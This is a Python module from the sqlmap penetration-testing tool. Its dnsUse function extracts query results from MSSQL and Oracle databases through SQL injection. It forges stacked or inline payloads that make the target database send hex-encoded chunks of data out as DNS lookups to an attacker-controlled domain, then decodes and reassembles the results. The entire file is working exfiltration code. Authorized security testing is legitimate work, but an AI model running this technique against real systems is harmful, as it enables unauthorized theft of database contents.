#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2012 sqlmap developers (http://www.sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re
import time

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import cleanQuery
from lib.core.common import dataToStdout
from lib.core.common import decodeHexValue
from lib.core.common import extractRegexResult
from lib.core.common import getSPLSnippet
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import pushValue
from lib.core.common import popValue
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.common import safecharencode
from lib.core.common import safeStringFormat
from lib.core.common import singleTimeWarnMessage
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.enums import PAYLOAD
from lib.core.settings import MAX_DNS_LABEL
from lib.core.settings import PARTIAL_VALUE_MARKER
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request

def dnsUse(payload, expression):
    """
    Retrieve the output of a SQL query taking advantage of the DNS
    resolution mechanism by making request back to attacker's machine.
    """

    start = time.time()

    retVal = None
    count = 0
    offset = 1

    if conf.dnsDomain and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.ORACLE):
        output = hashDBRetrieve(expression, checkConf=True)
        if output and PARTIAL_VALUE_MARKER in output:
            output = None

        if output is None:
            kb.dnsMode = True
            pushValue(kb.technique)

            while True:
                count += 1
                prefix, suffix = ("%s" % randomStr(3) for _ in xrange(2))
                chunk_length = MAX_DNS_LABEL / 2
                _, _, _, _, _, _, fieldToCastStr, _ = agent.getFields(expression)
                nulledCastedField = agent.nullAndCastField(fieldToCastStr)
                nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (nulledCastedField, offset, chunk_length)
                nulledCastedField = agent.hexConvertField(nulledCastedField)
                expressionReplaced = expression.replace(fieldToCastStr, nulledCastedField, 1)

                expressionRequest = getSPLSnippet(Backend.getIdentifiedDbms(), "dns_request", PREFIX=prefix, QUERY=expressionReplaced, SUFFIX=suffix, DOMAIN=conf.dnsDomain)
                expressionUnescaped = unescaper.unescape(expressionRequest)


                if Backend.isDbms(DBMS.MSSQL):
                    kb.technique = PAYLOAD.TECHNIQUE.STACKED
                    expression = cleanQuery(expression)

                    comment = queries[Backend.getIdentifiedDbms()].comment.query
                    query = agent.prefixQuery("; %s" % expressionUnescaped)
                    query = agent.suffixQuery("%s;%s" % (query, comment))
                    forgedPayload = agent.payload(newValue=query)
                else:
                    forgedPayload = safeStringFormat(payload, (expressionUnescaped, randomInt(1), randomInt(3)))
                Request.queryPage(forgedPayload, content=False, noteResponseTime=False, raise404=False)

                _ = conf.dnsServer.pop(prefix, suffix)
                if _:
                    _ = extractRegexResult("%s\.(?P<result>.+)\.%s" % (prefix, suffix), _, re.I)
                    _ = decodeHexValue(_)
                    output = (output or "") + _
                    offset += len(_)
                    if len(_) < chunk_length:
                        break
                else:
                    break

            kb.technique = popValue()
            kb.dnsMode = False

        if output is not None:
            retVal = output
            dataToStdout("[%s] [INFO] %s: %s\r\n" % (time.strftime("%X"), "retrieved" if count > 0 else "resumed", safecharencode(output)))
            if count > 0:
                hashDBWrite(expression, output)

        if not kb.bruteMode:
            debugMsg = "performed %d queries in %d seconds" % (count, calculateDeltaSeconds(start))
            logger.debug(debugMsg)

    elif conf.dnsDomain:
        warnMsg = "DNS data exfiltration method through SQL injection "
        warnMsg += "is currently not available for DBMS %s" % Backend.getIdentifiedDbms()
        singleTimeWarnMessage(warnMsg)
        conf.dnsDomain = None

    return retVal
